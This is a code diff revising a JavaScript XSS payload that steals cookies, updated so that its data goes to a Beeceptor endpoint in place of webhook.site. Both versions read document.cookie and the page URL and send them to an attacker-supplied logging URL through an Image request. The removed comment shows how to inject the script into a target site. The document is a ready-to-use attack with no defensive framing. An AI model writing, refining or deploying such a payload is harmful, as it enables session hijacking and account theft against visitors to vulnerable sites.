@@ -1,46 +1,45 @@
-/* * XSS Cookie Exfiltration Payload (Dynamic)
+/*
+ * XSS Cookie Exfiltration Payload (Dynamic - Beeceptor Compatible)
  * File: xss_payload.js
- * * Usage on Target Site (example):
- * <script src="https://yourusername.github.io/xss_payload.js?log=https://webhook.site/YOUR_ID"></script>
+ * Requires the 'log' parameter in the script tag to specify the Beeceptor endpoint.
  */
 
 function exfiltrateCookie() {
-    // 1. Get the URL parameters of the script's source (where the script is hosted)
-    // We use document.currentScript to find the <script> tag that executed this code.
+    // 1. Safely find the script tag that executed this code
     const scriptTag = document.currentScript;
     if (!scriptTag) {
-        console.error("Payload failed: Could not determine script source.");
+        // Fallback for extreme compatibility, though modern browsers support currentScript
+        console.error("XSS Payload failed: Could not retrieve script source URL.");
         return;
     }
 
     const scriptUrl = new URL(scriptTag.src);
     const urlParams = scriptUrl.searchParams;
     
-    // 2. Extract the logging endpoint from the 'log' parameter
+    // 2. Extract the logging endpoint (Beeceptor URL) from the 'log' parameter
     const LOG_ENDPOINT_URL = urlParams.get('log'); 
     
     if (!LOG_ENDPOINT_URL) {
-        console.error("Payload failed: No 'log' parameter found in script URL.");
+        console.error("XSS Payload failed: The 'log=...' parameter is missing from the script URL.");
         return;
     }
 
-    // Attempt to steal cookies and other data
+    // 3. Collect and encode data
     const stolenCookie = encodeURIComponent(document.cookie);
     const pageUrl = encodeURIComponent(window.location.href);
-    const referrer = encodeURIComponent(document.referrer);
 
-    // Build the full exfiltration URL using stolen data
-    // Data is sent via a GET request using an Image object to avoid CORS restrictions
-    const exfilUrl = `${LOG_ENDPOINT_URL}` + 
+    // Build the exfiltration URL
+    // Sending data via GET request using an Image object is standard for XSS data theft.
+    const exfilUrl = `${LOG_ENDPOINT_URL}/xss-data` + 
                      `?cookie=${stolenCookie}` + 
-                     `&page=${pageUrl}` +
-                     `&ref=${referrer}`;
+                     `&page=${pageUrl}`;
 
-    // 3. Trigger the data exfiltration
+    // 4. Trigger the data exfiltration to Beeceptor
+    // The browser will make a request to Beeceptor, recording the data in your log.
     new Image().src = exfilUrl;
     
-    console.log("XSS Payload executed. Data sent to logging endpoint.");
+    console.log("XSS Payload executed. Check Beeceptor for the incoming request.");
 }
 
-// Execute the function
+// Execute the function immediately
 exfiltrateCookie();
